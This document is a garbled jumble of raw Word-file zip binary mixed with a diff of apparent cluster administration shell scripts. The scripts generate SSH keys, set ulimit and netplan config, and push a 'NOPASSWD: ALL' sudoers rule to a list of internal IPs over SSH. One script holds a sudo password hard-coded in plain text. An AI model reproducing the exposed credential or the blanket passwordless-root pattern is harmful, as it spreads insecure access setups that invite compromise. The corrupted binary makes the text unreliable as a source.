-r´‹æÅéIÆÛ”kF·`\6ğ$eSŞæ¨r®M1¶¼ÉläÊ'WÚHæüÕ¬qËø;[¦„œc		æîa;Ñˆ|B¶Ó Á14 A9‹ã(ÆßZFÚ?†Ì‘RÖn×ú™F»ÇlÁ÷ÉI½µõ$ìº.ê’Á†÷ã×åıÓ0jX«~WP‘	>´K¹æ@îÛ2/ÉÍm¹@%4	É,$´$4¥—)!o>¨Æú¸giS\ùõU<>Üõº)Ü¿IÃ¬[úç[Õ ®wÅg¥7şŸìÉQû¿¿³0&!%%™¥‰?ôÈßPm~~‰âPK    ‡Nâ@ÛÑ@–  î     docProps/custom.xmlµ’]o›0†ï'í? ßŒ†DŠ¯TIW².”ˆÜLÈ˜Ô	Æ;iÉ´ÿ>G]6õb7›vyô=~Îññn_Y£H/(o}` ĞH‹yEÛ²¹îMÈ²­Ê†·Äàvöñƒ÷¹çé%%BSˆVøàYÊnj?VŠ‘Š[•Ô¼g¥Te¿3x]SLbŒ´Ò@Şø($gz÷ŞxÓ“ü[dÅñÅNäÙĞ)İ™÷>h5“´òÁ·Ø‰âØ’I¤›Ğõ‰5ëĞ……(šO‚ä;ĞºK3Z[25úız¥°ÕËğH›*'½BŸä´é^„ìg:H7ÑHíp„,9ñ;ôŒ«Ã?ÚXW›E”¿{>r"+FîØµQhGNà†ÑMQ`İ Ú¶ıÕ´ş‹}RëÉëšR^~˜ôëòD¾Ìûê'–|{×{NÓM¾Oï’×‚%/YxØî“áaS â¼³´e«xy(Îsºİcú)ZšåÃzóHWt1¤qqNÏO(ÍZ?úşŸ†3.§ğv¨³PK
-     ‡Nâ@               word/PK    ‡Nâ@×ò€ß  -r     word/styles.xmlí]ÍrÛÈ¾§*ï€â)9È")Š”T¦·lÊŠ]k;ÊJÎ‡ÀPÄÀ0 hZ~…óûû6É{¤§1 At’C|°D
-ø¾FwÏ7?˜Ÿ—?|ç«Œ_EÓŞàE¿çÈÈU=M{ŸïÎ®zN’ŠÈŠä´÷,“Ş¯~ÿ»—››$}dâ @”Ü„î´·LÓÕÍùyâ.e(’j%#øãBÅ¡HácütŠøËzuæªp%Rî~ú|>ì÷Ç=£¦½uİˆ³Ğwc•¨Eªo¹Q‹…ïJó#¿#>…7»óV¹ëPF)2Ç2 T”,ıU’£…T4xÄeòÕö_Ã ¿ns
-ÙFÅŞ*V®LˆIdÆ‡Â
-˜Áè ¨pÜpÜyöøç
-nôñ·’ƒ¾Íbãv}wN™ŒÑÎ¢øÁŸÇ"ÎÂ	P²{•ÌÖIªÂ[‘Šo³Ù¼Ø¬’ndÌ.EmpqÚŞÔsB÷æıS¤b1 97ƒQïd¦§Ü[¹ë MôÇø>6Í'üq§¢4q67"q}Ú{ôCHæOrãü¤BÎİÜ,_GIõ_¤HÒ×‰Vÿë×¿ÿó·è«İääüÕËsäÏ–ìXVeWíÉ	©ú•1@Wë(ö†c( ğ€rñ—;,WÓ^şÅçhé{òç¥Œ>'Òƒ²l.|¡ÿÎ÷<©Ë·ùîóûûØW1”¾iïúÚ|ùA¹_¤÷±FÕN
-ïí7W®t9Ú¿åœˆ³Ş#DCÖş¿HJôøE$BÀÿ¤­zğèœ,K)´’9ƒSˆö-ÏÍ!†í!.ÚCŒÚC\¶‡·‡˜´‡¸jq]	Ñ*±ıÈ“ßj®àê4ì ¸:9; ®NÙ€«¹àêôî ¸:é; ®.
- 3T¹ÅCÃ2ËP44,CÁĞ°ÅBÃ2
-ËP$4,CĞ°Å!k9ï¡ÚˆÒî«£…Ri¤Ré¤ò¼ˆ »QLºù%c¿pàfÕ¿i4Vš½×ˆ®nuºÛÜ• ­d=Õ=%G-œ…ÿ´¡3_ÕoÅ £¯2€Ş #<8b™ÂhA÷PšX.dã!²{RÉad	üH:Ñ:œsäúJ<ñËÈCİbtNNÁ#EIët©ûÚ>GiŒuŸ©MÄZ)Ä?a¨Š4ªóf’üS9BËÚ®ˆËĞxEÜQ÷I‡¸ÍWÄÍ2ƒ£‹P†çò¶±ËéË÷YÁaó½çò½çò½¯öı^c±Íˆë£Ÿí˜Y ô‹‰îÕàÁŠ´ïªm¦8&Ğ5CğÎ½ˆÅS,VKG¿	èŞş7Ê{vYz]4[·5m~ñ£uu Z· œM
-.e(¸´¡ ¨V‡V1ø}3İ€WßÃ¦²š÷=ëyÊ#@"XgCİ—ax3ÉıÛâ{çÇĞhåû©æá(nŸô“N$–š`ûä-8ƒJlÁ³søş€ƒã9x7\_™u¨ïW2†Q‹/İæ;j#=;E‡ÏòÆª¦eÔ!ËÛpµ‰Ÿtï°[3_Æù(Vİ£ß0¤>§ZÕmoÏ`¢Iàtß„¬©İÌ ş~–ó?vï©w?8¯aœ'z¹Ğ¹ÆjÑö™_SvX2"å1Ô×İ?‚A<Å0ŞŒ?Êç¹0ÇªjD¾kGİÃ°*ÎJe5a«â‡Ïó ÂG‡Á¡šØÀ˜*Ç°6üUÄ¾~UÒY4ÊÓœÇZèV~/½SHÖó_¤ËĞ­EÓAYup9Şãïà3´÷vğšJş,0_“e¢Ã.›‡ò'`wCßÙ¸H*^¬¾,å|QÈøÂ ‚u%¬NBN!»‹83Ÿ€a”'+
-Š}/ÂˆÎ^Dg‹-¢³Ñy£Ê0/«”3Ó³Jè³´2t¾®ôİªUBgËw´-ß-ß-ß-ß-ß-ß/n¹X@{Ÿ±/q°å~‰ƒ­èw*2\Áš¡ø¹²w×B¼ä“àx©˜	Ğ}¬z=˜Šj–Ğtğú…k/ÃgK%ŠãkñhpVË²ÿ€áoXÆÅóJz[«s•©GXUZ=s4Û³Es5c·ü§eê<,[¼¼ãz8+¾ÖšgÆC½>Ï
-®›™DğøGéùë0wµ4G§SËÔøò8VÀÄ&áÖ'×†Àx	ñ©öOãcW‚j?,â>f?âSíÇ%¤5)jüƒøDY›ØV’ŞÂšr‡^¼&¶²[ğ´’‡‰­-ÁVˆü"asÿ|Â[*–±¥Â‹Œ‹YK[82LÖ–,¶ ì+k[¿5‘Ø¶\'km[¢“E·-ÑÉêÛ–èdnKt²·$:M˜Û’ØT¡7£Ğm¹lÚPpu B›<D]èPcñ¦6la:o*‹-@‡âMe±E§N¼©\ñ¦r5o*Qcñ¦5o*Qcñ¦5o"Q3ñ¦’ØT¡Ğ¹=ñ¦rÙ´¡à*‹7•È&QY¼‰D§\äõ±‡uâF[[€Å›ú,¶èÔ‰7•‹"ŞT®ÆâM%j,ŞT¢ÆâM%j,ŞT¢ÆâM$j&ŞTŠxS¹lÚPhjY¼©D6y(ˆÊâM$j.ŞÄ÷²Å›ÊbĞ¡xSYlÑ©o*E¼©\Å›JÔX¼©DÅ›JÔX¼©DÅ›HÔL¼©$ñ¦rÙ´¡ĞÔ²xS‰lòP•Å›HÔ\¼‰Ó^Š7•Å Cñ¦²Ø¢S'ŞT.ŠxS¹‹7•¨±xS‰‹7•¨±xS‰‹7‘¨™xSI(âMå²iC¡©eñ¦Ùä¡ *‹7‘¨¹xg6o*‹-@‡âMe±E§N¼©\ñ¦r5o*Qcñ¦5o*Qcñ¦5o"Q3ñ¦’PÄ›ÊeÓ†BSËâM%²ÉCATo$‚íïË;ÙëíŞñÜ˜”ÂÎio•oÃ£§(Á¾öz×~³Q=^ø·²×÷é”pÍW‡”·‡ıõÔOn…½qí¬Y,‹¿o÷£Ïoíg3å`û}ºñ=µÑS‚cì]ñ‹›1Wp¸ÀÁÃ˜ÛàH}w¼sˆ ÎPœöB?Rñ;}v€~$<D ò/ù!å?¾5è;İ$ÕSàßó3Ë“ï¹]C3,ù>Ó' g†øª¡tê zñˆßOqÛÿ²§Í.€ù&Ès‡üY€lÆ€¶9Úûj;,‹ÃÎÖUÃ”¬„«7òßÜÌõÂe<  øğÀ\`2G,`e°9ß»ù·ñä"µÇwéëÓòˆéè˜c#¶ç?˜Ó"¶_äWïa®@æÙÿ³~‘qáY“¦¥`›µ	;ÁÎ×+ô†DFgŸ´…[şïË³Ù'ıÕ’hÚ±yXÌbH•F)rQ›"¦«ıÿ“Aş;)b"°“"ù KŠ¸KoW/Ã‡ìªQïÉAÂÀ^
-Zæ+·`;Pó=!9AÜë3:Åu÷õ¦L5;{àôöL~;0ê¾yÕ ğËLÁGk‰NÕ
-ŒƒspÒNVAzßDF¬U*ûë ³½¿C-‡éÔßãDw„¯ ¯•É>j#ëİ¹SwuHvO¹Á·œ¨Šÿñ¢^† ã‘?ğzˆâV
-è¹˜æOİƒ«ó®¾îŠáddÖqÕ]q1†9ï(èuWŒ.¯Œ¾×]q9º>béx48béäbxÄÒ«áèˆ¥à°#–úıÉSıëë#¶×ÔV§†`î‘K.&£cæÆ—yËœÙò¿Ğ°×ıæ¹ÿsÂ^]´/ëô±´óC©æhıÁFı 
-ZŒÚ¢<êß1	OH‰“"ğW»…ğ^D§¼Ù^\LËñ$q5½9x*ƒ#­Æ&AaÛõm{Û°U›G«Œ½®Ş<#¯úğïî.î:ÿRï\›íñC}®AvPÚAm7+v¢bx°İnç´7SëØ—±>½N·ÃLOdïÛmw Ü)õ/0óıWÿÉ«PK    ‡Nâ@bô¥  ş     word/settings.xml¥XISÛH¾OÕüÊw°zQ«åŠ“Òš„	$“¤à&Ëm,Ôª–Œc~ı<m˜Œß0©„­·~oëÅ¯Ş|/ò“eêL—ó	9³&'ªLõ*+oç“/Wñ©œœÔMR®’\—j>Ù«zòæõŸ¼ÚÍjÕ4 VŸ€‰²é|²išj6ÖéFI}¦+Us­M‘4ğin§Ebî·Õiª‹*i²e–gÍ~J-KL3z>Ùšr6˜8-²ÔèZ¯›Ve¦×ë,UÃ¿QÃüŒß^3Ôé¶PeÓyœ•]Ö›¬ªGkÅ¯Zƒ7£‘‡—‚x(òQnG¬—$‡pwÚ¬4~^«Pªº†yn‘då“Â=¥úR=í}O[S N¬nu@^çGúHµû*~È–&1}™¡¡¨ê`[7º“&y²·ÛíÎvU}––ˆgU#l
-¬ƒÒä¤HgïoKm’eí¹#|òzóQëâd7«”I¡ÜĞØ–5™¶Œ%ÄİêKİ,¶Æèm¹z§ øCQ½ kİ	®†úd€™¶ı–T	MŸª¶×,®²ºÊ“ı;m²G]6Išdõyk²U#¸ê ÿU™&KÿWºÔŸ¶eÚl»şK™,ÿË`?tmVmøÑ÷
-æz±ÉÖÍgÕÀĞu	êXßLR]©ïÍ·¬Ùtf¬/µŠ’ºñê,)}£’ûÏÛ\Õ[«8úìõ¶ùAş}¹‚<xõå¶X*¸®’å¢ÑU'ÔƒZô{	 .“êØS‡ıáB¯ÔX[“=5É¸ÅügÓ¶
-]=¡#^p¤!ñrµhö¹Š¡6‹ìQyåêš3ƒ§Ëéo x	€*[Ïa§¼ÚW*V	TöØ_÷%g]qã<«.2h}ÓæwMw³ç•~MLİ7Y»|^ÒBÃ9Ò$O¥Qûs}ó6¿§³Ëo_ï.ßFß¯‹hwqåßßÜEû‹o×ôúñ–_Ó›âcx~ıg7wi¶ş{>oÃÏ0}£?8ÃVãvñFuì køë3ÓrğØ²c–ğİaĞaÍc‡!:väÛÅtwÆbDÇ	ÆéĞ£?øqBÁá#:’GœûÃFõƒôˆå
-Ìš'mG†˜µ€îX¶øÄBAÈ™‹qü’Ø9æ‹Yï":„Jb9Óá>!GrM„àÌãHˆ”®y@H—Rá'ä”&9Ô¢¾ˆ¤C¨% Ğ ÁF	×FPâF¤
-”nÙ‚2+d›íq!™@8‚8$H®©c1&¤¦Ô‘¾C"$£Ô	CêQŒ#ILlJ¨ô\›SÁØ>RmÚz‘åHß
-m,ÒP†" ˆ<"n„Ô”‰üs=‡X1â‡ùÂ$Fú€RA0kAâÑãú°X2byÆ‰(‹°úp+ä„1ïX‡“0‚­éÎb(« æ¶cÖÄ[6.)ìŠ1Ò;ÜµcF|dá®Ï¡ÜÏs‚Ğ¡ÄÉâ”ÇÅæÇ¦>l™,›Ù.‘1m{’ùÒ;¶CKDÈ4Ú¾Ëx$‘xì8…-Ş7\ØH¤ÂRØÉ(loÒb.‚ †×ç–ƒt•²ã İ+dËAPW2ê1¤wDH#fÈÔ‹Ğ—‚Ø'Ô±±	†ÚPbñ8R4ğì@ ân²à¨o:8ß‹YûÒúdÚÕÒÜûYyRô7½¥‚K·jçcä,¶Ë‘yzÚ3ê"ÉóØ$éÈèÂ(fím;TëN9¿HÌíÁî aPêJ­ÏŸlµeŞÂ«¢ê½íà"İß²Fw„÷‡V1ËÊæCVŒôz»\ŒZ%¼–±à‰òñÁ´§‡àw³ÙİmõCr¸ê«òôË¢½`©á’>Ÿ<nNƒËVîi¹Y´osu‘TUÿ@XŞ’ù$Ïn7iÕøZÁ½ûXŞÒG;|µ¼î#IÛ`AzX´ı¤†ÅÆF;ĞàÚËñÍiö&FüF°›mà–lò¬¼‡§À¸lékçz§VïFâ|rDêRxøáâõ?PK
-     ‡Nâ@               word/theme/PK    ‡Nâ@€Àÿ’  ˆ     word/theme/theme1.xmlíYOoE¿#ñF{oc'vGuªØ±hÓF±[Ôãxw¼;õìÎjfœÔ7Ô‘q 7¨ÔJ\Ê§	A‘úx3³»Ş‰×$*h­=û›÷ÿıæÍúêµ1C‡DHÊ“¶W¿\óI|Ğ$l{w†ıK’
-'f<!moF¤wmëİw®âM‘˜ ØŸÈMÜö"¥ÒÍ•éÃ2–—yJx6æ"Æ
-¾Šp%øäÆleµV[_‰1M<”àÄŞ©O¼­\lìDI½à31ĞBÉ"6˜Ô5BÎd—	tˆYÛ?’ÊCKÚ^Íüy+[WWğf¶‰©%{Kûúæ/Û—m&«F§G…Òz¿Ñº²SÈ7 ¦q½^¯Û«ò û>xjm)Ëlô7ê\f	d?.ÊîÖšµ†‹/É_[°¹Õétš­Ì+Ô€ìÇÆ~£¶ŞØ^uğdñÍ|£³İí®;x²øõ|ÿJk½áâ(b4™, uBûıLzs¶[	ß øF-ƒÏQPEuic¨eµãû\ô +š 5KÉûP¿]ÅZŞ$¸ôÄ.ùraIëBÒ4UmïıC/Ìå½~ñíëÏĞñÃçÇ8~ôèøá÷V³k'ay×«¯?ùıÉ‡è·g_½züY5^–ñ?÷ÑO?~Z„ö™›óòó§¿<úò‹ıæq|[àQ>¤1‘è9B<ÇLT\ËÉHœoÇ0Â´¼c;	%N°ÖR!¿§"}k†Y–Çq#xW }T¯Oï;"1U´Bó(v€{œ³•Q¸¡u•Â<œ&aµr1-ã0>¬ÒİÅ‰“ßŞ4ŞÌËÒq¼ÇÌ}†…C’…ô3>!¤Â»{”:qİ£¾à’ºGQÓÊéÈ©¦ù¦]C^fU>C¾ØìİEÎª¼Ş!‡.º³
-ã‡„9a¼§
-ÇU"‡8få€ßÄ*ª2r0~×“
-2ÆQ/ RVí¹-ÀßRÒo``¬Ê´ï±Yì"…¢“*™71çeäŸt#§UØM¢2ö=9ÅhŸ«*øw;D‡<àdiºïRâ¤ût6¸CCÇ¤yè'SQ‘Ëë„;õ;˜±1&†j€Ô®iògÄÍ(0·ÕpqÄTùòË'v¿©”½§WUÏì êe¸“ôÜå" o>;ïài²O !¨·äü–œ½ÿ<9/ëç‹§ä9AëYÄÚfì—NİcÊØ@Í¹)Íà-áì	ú°¨÷™»&)naiu'ƒ
-== /root/conf/unlimit.sh
-for i in {2..16}
-do
-  HOST="g$(printf "%04d" $i).para.ai"
-  echo "Updating .bashrc on $HOST"
+
+USERNAME=$1
+USER_HOME="/home/$USERNAME"
+ssh-keygen -t rsa -N '' -f $USER_HOME/.ssh/id_rsa
+cat $USER_HOME/.ssh/id_rsa.pub >> $USER_HOME/.ssh/authorized_keys
+
+# æ·»åŠ ç¯å¢ƒå˜é‡åˆ° .bashrc æ–‡ä»¶
+echo 'source /usr/share/modules/init/profile.sh' >> $USER_HOME/.bashrc
+source $USER_HOME/.bashrc
+--- /root/conf/set_sudonopasswd.sh
+#!/bin/bash
+apt-get install expect
+apt install python3 python3-pip
+pip3 install spawn
+# å®šä¹‰ç›®æ ‡ä¸»æœºåˆ—è¡¨
+declare -a hosts=(
+  10.102.2.161 10.102.2.162 10.102.2.163 10.102.2.164 10.102.2.164 10.102.2.165
+  10.102.2.166 10.102.2.167 10.102.2.168 10.102.2.169 10.102.2.170 10.102.2.171
+  10.102.2.172 10.102.2.173 10.102.2.174 10.102.2.175 10.102.2.176 10.102.2.177
+  10.102.2.178 10.102.2.179 10.102.2.180
+)
+
+# sudoå¯†ç 
+SUDO_PASSWORD="Kgzs@2024"
+
+# ä½¿ç”¨æ›´å®‰å…¨çš„/etc/sudoers.d/æ–¹å¼
+SUDOERS_LINE="kgzs ALL=(ALL:ALL) NOPASSWD: ALL"
+
+for ip in "${hosts[@]}"; do
+  echo "æ­£åœ¨å¤„ç†ä¸»æœº: $ip"
   
-  # ä½¿ç”¨ ssh è¿œç¨‹ç™»å½•åˆ°æ¯å°æœåŠ¡å™¨å¹¶è¿½åŠ  ulimit åˆ° .bashrc
-  ssh root@$HOST 'echo "ulimit -l unlimited" >> /root/.bashrc;source /root/.bashrc'
-done
-== /root/conf/yaml.sh
+  expect << EOF
+    set timeout 15
+    # å¼ºåˆ¶åˆ†é…ä¼ªç»ˆç«¯ (-t)
+    spawn ssh -t kgzs@$ip "sudo bash -c 'echo \"$SUDOERS_LINE\" | sudo tee /etc/sudoers.d/kgzs-nopasswd && sudo chmod 440 /etc/sudoers.d/kgzs-nopasswd'"
+--- /root/conf/synchosts.sh
 #!/bin/bash
 
-# ç­‰å¾…ç½‘ç»œæœåŠ¡å°±ç»ª
-sleep 5
+cp /data/apps/conf/hosts /etc/
+### KEY-FINGERPRINTS
+/root/conf/root_rsa:
+total 16
+drwxr-xr-x  2 root root 4096 Apr 18  2026 .
+drwxr-xr-x 10 root root 4096 Apr 18  2026 ..
+-rw-r--r--  1 root root 1600 Apr 18  2026 ssh_config
+-rw-r--r--  1 root root 3227 Apr 18  2026 sshd_config
 
-CONFIG_FILE="/etc/netplan/00-installer-config.yaml"
-BACKUP_FILE="/usr/local/bin/00-installer-config.yaml.bak"
-MODIFIED_FILE="/usr/local/bin/00-installer-config.yaml.modified"
+/root/conf/ssh_rsa:
+total 16
+drwxr-xr-x  2 root root 4096 Apr 18  2026 .
+drwxr-xr-x 10 root root 4096 Apr 18  2026 ..
+-rw-r--r--  1 root root 1600 Apr 18  2026 ssh_config
+-rw-r--r--  1 root root 3299 Apr 18  2026 sshd_config
 
-# è®°å½•æ—¥å¿—
-exec > >(tee -a /tmp/modified_yaml.log) 2>&1
-echo "===== è„šæœ¬å¼€å§‹æ‰§è¡Œ: $(date) ====="
-
-# 1. åˆ›å»ºå¤‡ä»½
-echo "æ­£åœ¨å¤‡ä»½åŸå§‹é…ç½®æ–‡ä»¶..."
-cp "$CONFIG_FILE" "$BACKUP_FILE"
-echo "âˆš åŸå§‹é…ç½®å·²å¤‡ä»½è‡³: $BACKUP_FILE"
-
-# 2. åˆ›å»ºå¯ä¿®æ”¹å‰¯æœ¬
-cp "$BACKUP_FILE" "$MODIFIED_FILE"
-
-# 3. æ‰§è¡Œä¿®æ”¹
-echo "æ­£åœ¨è§£æé…ç½®æ–‡ä»¶..."
-
-# è·å–å½“å‰bondä¸‹çš„æ¥å£åç§°ï¼ˆæ›´å¥å£®çš„è§£ææ–¹å¼ï¼‰
-current_interfaces=($(awk '/bonds:/{flag=1} flag && /interfaces:/{getline; getline; print $2; getline; print $2; exit}' "$MODIFIED_FILE"))
-
-if [ ${#current_interfaces[@]} -ne 2 ]; then
-    echo "é”™è¯¯ï¼šæ— æ³•ç¡®å®šbondæ¥å£é…ç½®ï¼Œå½“å‰é…ç½®: ${current_interfaces[*]}" >&2
-    echo "å°è¯•å¤‡ç”¨è§£ææ–¹å¼..."
-== /root/conf/~$untué—†å—™å…¢é–®ã„§è®².docx
-Administrator                                         A d m i n i s t r a t o r                                                                                 == /root/conf/é—†å—™å…¢é©è™¹î”…éç‰ˆåµå¨´å¬­ç˜¯.docx
-PK
-     ‡Nâ@            	   docProps/PK    ‡Nâ@›A’&  ¥     docProps/app.xmlÍNÃ0„ïH¼Cä{âŸ&m¨œT!¥'$*5…ce9›Ö"±­ØTíÛc@¸rœ™Õ§Ùá«ËĞGg2º@4!(-M«ô±@ûfç(r^èVôFC®àĞª¼½áÛÑX½„v:yo—;y‚A¸$Ä:$áƒØt’°6òm í1#dáâA·ĞÆöˆ¾ˆË³ÿ/´5ò£Ÿ{n®6.yc¼è5@ÉhÎñ$ùNŠêp\v¢wÀñdğG¥_İŞ6f-<|çM^YÛ+)|Ø¯|Ùî¢§Ï”%aÌ„ÎSº8lèÃŒ-îë˜Íïê8em\ÑŒÅ$«³”ä„°ºâø7‰ãißòPK    ‡Nâ@İÍQÃH  b     docProps/core.xml}’]KÃ0†ïÿCÉ}›¤"¥íğƒ])VïBr¶›’ÌnşzÓn«ÅËä}ÏsŞ““j¾U]òÎK£kD3‚ĞÜ©W5znéJ|`Z°Îh¨Ñ<š7çg·%7±à‚ŸD’ö%·5Z‡`KŒ=_ƒb>‹Å¥qŠ…xt+lg+À9!—XA`‚†`j'": Ÿvãº 8†èà1Í(şöpÊÿY0*'N%ÃÎÆ™qOÙ‚ïÅÉ½õr2ö}ŸõÅ#æ§øõáşi5•zx+¨©Û•Ü ’(÷íÊKq{×.P““¼Hi’¼¥¤¤%!o>ºõpÏ2®¹JjéƒcÁ¸Á:)ÃZ:æÃCÜàR‚¸Ù5Ÿk³©ğïû)¡:xÿ8KÉ,-HK‹2‹“ˆG@3¶ùù+š/PK    ‡Nâ@Ò| *       docProps/custom.xml¥‘MOƒ@†ï&ş²÷e?(P é.š¨½²,-	ìv©6Æÿî6µ^ô8y'Ï<3“®_‡Ş;ÈÉtZe€øxR	İtj—§Ç
-.gl­šº×Jfà(Xç×Wéı¤G9ÙNÏ!”ÉÀŞÚq…{9ÔÆw±rI«§¡¶®œvH·m'd¡Å<HeÅ8Bb6VpüÂ3ou°E6ZœìÌöñ8:İ<ı„½v°]“·"äEâÒ2á`Â`$1ÄKŒ)£¼J6å;ğÆS3ª·úíÃÃ6³°lîúf+'‡>ØU?¾;å‡ê»ú$Z8EßaŠ.ÿ´	.67|ûc|…¬b”1Bãß”ğ€2^ò(¨x?ú›:]ëüËüPK
-     ‡Nâ@               word/PK    ‡Nâ@€ÿTzı  Á[     word/styles.xmlÍ\[sÛº~ïLÿ‡Oíƒ#ËrìÄåŒ-Çu¦vêÙç<C$dñ˜$X^,;¿¾‹HQ¼€ÂòL§ÉƒEŠ»ßbwñá"p¿üò…Î+O³@ÄswúáØuxì	?ˆŸçîÓãÍÑ'×Érû,1Ÿ»ï<sùú×¿|Ù^dù{È3ÄÙEäÍİM'“IæmxÄ²"á1|¹iÄr¸LŸ'K_ŠäÈQÂò`„Aş>99>>sµ1w‹4¾Ğ*¢ÀKE&Ö¹¹ëuàqı§”HÁU’×Â+"çˆ8Iy6ˆ8ÛIVj‹¨Ú ‰›RÉ«©¯QX>·=l+R?I…Ç³b…Êøˆq¥fzÚRT9î8n¢š?‘ª@|zŒŸjvLMk·Ké2[ˆÑVQ¼V)KU˜!jv'Ù¢Èr]³œUú¶Ûí‡m’}ğbmv-jÓÙ¾Ú	¹Nä]|EÊV!$çvzê~…Ìô…wÍ×¬óL^¦©¾ÔWøçFÄyæl/XæÁ#¤,(ˆĞu{gßlä‡Îo8ËòË,`õ/¿é{RÒËòšÂ«ÀÜÉ×/4¥ü[3)©TO5ì‡<…¬]ªîÊEçs÷äú*´•¯ÿ}ƒ]lî–7âMàóß7<~Ê¸İZ?¸äQpø>—]]ß{úş"…8w?Ö7ï„÷ÂıeÀR«ôW˜ùßŞ<È.°ÿ)1QOÑ DCŠ`§od5x¼3éôÒúP:h,
-šßƒ²áL’š3=¨f9êT†–*NÆ«˜Wq:^ÅÇñ*ÎÆ«8¯âÓxŸ;UÔsXõ•
-Aìó·\2Ët'Y¦;[Ì2İéa–éÎ³Lw˜eº#n–é±Yf8¦³Z÷Î…w@D›ÃñlJG³)1Ë¦Äp$›ÃqlJG±)1Ã¦Äpë½R$ÎwèœqnÕŸ×Bä±È¹“ó7;IƒN$íeå€ÂSkC-EWéÁ«¬1˜×F¿ÙG9#Pœç1ü;5ôõÃ\NÌ±vÖÁs‘ÂÚ¡k”ïæñ+a^é0ßY¢pÊsXRXWÙò5Oa=Ä­Äk)AS1wâ"ZYF:aÏ$9û˜ü4kKië®S%+òœ‚–	1XZ…&Ì1õ„¾T¼2;ZÎU†œ ÷Ã>ôˆ7<ÕÙE†£–È©•Çex8j¡(ß9„&iIBË´$¡Z’ĞNkJ;µ$¡Z’ĞN-ÙİÎÆ02´&4­Öƒ<´#İE(ä‰Un.ƒç˜Áè0Œ„«\5êu»óÀRöœ²dãÈ+Ü+á¿;¶3JŠ2ÁÁn¸ Cƒ¸nn«7–’”<­d	™ZÉrµ’íÎÖ>ª¿‡™†Goû'g–‰>ÅìéÙ—X«Ü:Ù—,,Ô¤Ó*ï`£Í.ö»”»	RĞ3ën–yôCNÍe@l{øİn ÙÉÙ%íNN¹Ê²-qKôöíú‰¥‘¶µi¾êï=zûğ¦¤/V¹v#ÂPl¹o–n˜44dœœÈåHË<=€-Œi»ò[”lXdVŞ(7±{–X	>„°cŞÒ>ûv;í¡sø Wg|½ŒşÛï|õw+coïïœK˜“ÇïA°ÊCÄE`IkJJøvdˆR0ú1¬T„İŠeÿÉßW‚Á¯(6‹`”|€•îñçœ ½dQb9›BÔGèø[X–Y®BQö7–ríßÙÖFwl‘šhé4|ìUÓ—üµõwV¬şàİì¡ëH§°!Xï9{¢v#Î¨í+ÑEÈà'ÂC¶0Û—²“KÙ16ÛÍît{E(Òu’B´(…I-.…IMaÅÕj”%²cl&†	qí&á*ÄÿHŸä(¤x	).BAŠPìœá]ûvgGÄáÍûÁá=ü¶ .>»xíãp• (H‰#
-Râˆ‚”8¢ %(H‰#
-Râˆ‚”8Î®¾^ÃxJ£¯š8%¦5qJdåv 8+’¾wÎJÌ©ø-äÏÌrŸG%ñC*Öòôˆ{N9˜åu"¢D)Î†¹?‰y¥Ï.ªW˜p¥w­1ËZ[ªŸ{Ö–»ñˆ:xJ¨[nÈ(uÆ§Ç¨»ày“;Ëa[dP¿ikJé—lA4Ş´ZWÊåXDT>3lÜs?(¢Ò5}‰<èœÓÃ!zr~_í‰¯nÒuÏè9¨NVön˜ÔõSí?ÖóªıpütÈ~ÔOµßô#„öêïá¦!ÿŸ›v’®á4¬Cï^ç¦¾[-pFÑÃ¹©W#š`êÄ•ş$arÿ}Â¶•‡FÈTaŠÅGÇ¢˜Â±#Ô±(¦ 4™u,–ÅÅ:˜kÇLºcfß±@ÓğX ƒùx$ĞaÄ<ÄÄ
-½i†‹eâ†
-çã¨îÜDšã€Ÿû–®£NLaj“7Å 6ySQLÑé#o*…¼©XÖäM²&o*5yS¬É›
-dMŞD ;ò¦‚˜X¡â¹yS±LÜPaÕÉ›
-d¢‡
-¨NŞD {ò&®°ÎLaj“7Å 6ySQLÑé#o*…¼©XÖäM²&o*5yS¬É›
-dMŞD ;ò¦‚˜X¡â¹yS±LÜPaÕÉ›
-d¢‡
-¨NŞD {òîùÅlh{Ì’¼©(¦ µÉ›ŠbŠNyS±(äMÅ²&o*5yS¬É›
-dMŞT kò&Ù‘7„BŞT,7TœZ'o*‰* :yìÉ»çÔÂŸLŞTS€ÚäME1E§¼©Xò¦bY“7Èš¼©@ÖäM²&o*5yìÈ›
-B!o*–‰*N­“7ÈDP¼‰@öäİsrìO&o*Š)@mò¦¢˜¢ÓGŞT,
-yS±¬É›
-dMŞT kò¦Y“7Èš¼‰@väM¡7ËÄ§ÖÉ›
-d¢‡
-¨NŞÕºê…·du*¬xç‘rx1fî&åÀòˆ”á’õÆt]-|ğ;VŞ’rò}xæ•AÙ´zµ+¨{ ~å 
-õğ }d?ïN…–¢Çê¤T“J·/¶òPk*ÂÆYÌ’G-Ò¨Z4K˜'‹`m/Vò…"h„pØ^ò)/dõ‰¹;›b|äÅ¯…,®&Uüá•x!_çòøJ[µÖ¤qéÿ¾ºš,Œo„”¦ÍğŸ2ø…§²fú_ÿ‘ı¬nTw²œz¨üÕƒ¡³ğ–2Ôeñ·¹ûss´ø!o­ Âx(=Z^jw À-˜	íÜñ6<|³
-¤{rç#Ö]«ç¼|&“¬óÕóİB•={€„ÂCyıFæøæU¿³–íW¶Z)>l§¹ÀÛØš|ªTƒ†÷/	•ñä—ê¨şS22]Õ·Óc ß¯DåûåS<p‹ê»€'ëÆ¨Kid¿‹÷8¤b“–ckõVjúı«Êg}°2†j`8fª¾Õrı€c•t?~á<ù:Ñ×òâˆ Ã«6‰ ¯5‡àgE!§ÊÉf
-‘§îÊE‘Ë‡ï^÷	Ü·Ï.+´cµPöìuûé¥ü¯š²ëã§úm‡ìç®«{ { «V½ 
-*2Yï˜ÍãáémxË€ÀôV¦_AN(Ö*	Ee:\¾€W-!şè‹¹»¸Z\_«±ü'ĞºüFFX\º'¥«~B”/ûQ<€²œ>¿-Óİ¾õJÁoTªcW¡P—šŒ<õ÷õ2„Ú"%À.Çå³ø|8dh¨rî¬E	ë)§×Ÿ­”Û¯Ô‰ù5@:õÀ¾×Ù?Í˜fXît!Ç_(äº_/ (½ ã$1§§²ZÔM†ê*aà×.e	a¾SG>Ši²fÀ
